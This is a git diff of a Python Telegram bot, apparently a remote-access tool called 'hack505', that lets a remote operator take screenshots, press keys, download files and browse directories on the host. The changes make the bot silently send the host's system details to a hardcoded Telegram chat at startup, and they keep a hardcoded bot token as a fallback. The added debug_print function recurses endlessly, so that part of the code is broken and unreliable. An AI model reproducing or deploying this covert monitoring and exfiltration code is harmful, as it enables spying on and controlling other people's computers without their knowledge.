@@ -5,20 +5,30 @@ import subprocess
 import pyautogui
 import datetime
 import platform
-import random
+# import random
 import socket
 import os
-
-
-# ROOT_DIR = "/"
-# os.chdir(ROOT_DIR)
+import json
+from colorama import init, Fore
 
 try:
-    with open('token.txt', 'r') as f:
-        TOKEN = f.read()
-except Exception as E:
+    with open("config.json", 'r') as config_file:
+        config = json.load(config_file)
+
+        TOKEN = config.get("token")
+        chat_id = config.get("chat_id")
+        debug = config.get("debug")
+        print("all info imported form json file")
+
+except Exception as e:
+    print("can't able to import information from the json file!")
+
     TOKEN = "6845961407:AAGbKJc7LSpkokCVw-jJg9ByyaLoO3oBT_Q"  # @hack505Mark1bot
-    print(E)
+
+
+def debug_print(message):
+    if debug:
+        debug_print(f"{Fore.YELLOW} ")
 
 
 def cd(update, context):
@@ -56,42 +66,22 @@ def system_info(context):
             f"Machine: {machine}")
 
         try:
-            update.message.reply_text(info_string)
+            # update.message.reply_text(info_string)
             sys_info_send = True
         except:
             pass
 
         # Replace 'YOUR_CHAT_ID' with the actual chat ID where you want to send the message
-            context.bot.send_message(
-                chat_id="5118057698", text=info_string)
+        context.bot.send_message(
+            chat_id="5118057698", text=info_string)
     except Exception as e:
         # update.message.reply_text(f"Error: {e}")
-        print(e)
+        # debug_print(e)
+        pass
 
 
 def yo(update, context):
-    greetings = [
-        "Hello!",
-        "Hi there!",
-        "Greetings!",
-        "Hey!",
-        "Welcome!",
-        "Good day!",
-        "Nice to see you!"
-        "How it's going!"
-        "what on your mind now!"
-        "say Ram Ram"
-        "say jai shree Ram"
-        "did you done it today?"
-        "What do you think"
-        "Drink some water now!"
-        "What is time now?"
-        "you are doing great!"
-        "what is sin 0^2 * cos 0^2"
-    ]
-
-    update.message.reply_text(f"{random.choice(greetings)}")
-    # print(greetings)
+    update.message.reply_text("I am still Alive!")
 
 
 def take_screenshot():
@@ -128,7 +118,7 @@ def help(update, context):
 
 def content(update, context):
     update.message.reply_text(
-        "this project is owned by hack505. check out there github page- www.github.com/hack505")
+        "this project is owned by hack505 . check out there github page- www.github.com/hack505")
 
 
 def screenshot(update, context):
@@ -192,13 +182,13 @@ def download_file(update, context):
 
 
 def press_key(update, context):
-    print("Press key to continue")
+    # debug_print("Press key to continue")
     try:
         # Extract the keyour_context_variabley combination after the /presskey command
         key_combination = update.message.text[len('/press '):]
         if key_combination:
             key_combination = key_combination.split()
-            print(key_combination)
+            debug_print(key_combination)
             pyautogui.hotkey(*key_combination)
         else:
             update.message.reply_text(
@@ -251,7 +241,7 @@ updater = telegram.ext.Updater(TOKEN, use_context=True)
 
 def edit_message(update, context):
     try:
-        print("i have reached here to edit")
+        debug_print("i have reached here to edit")
         new_message_text = "This message has been edited."
         chat_id = update.message.chat_id
 
@@ -299,3 +289,4 @@ updater.job_queue.run_once(system_info, 0)
 
 updater.start_polling()
 updater.idle()
+# I am using vim it's cool!
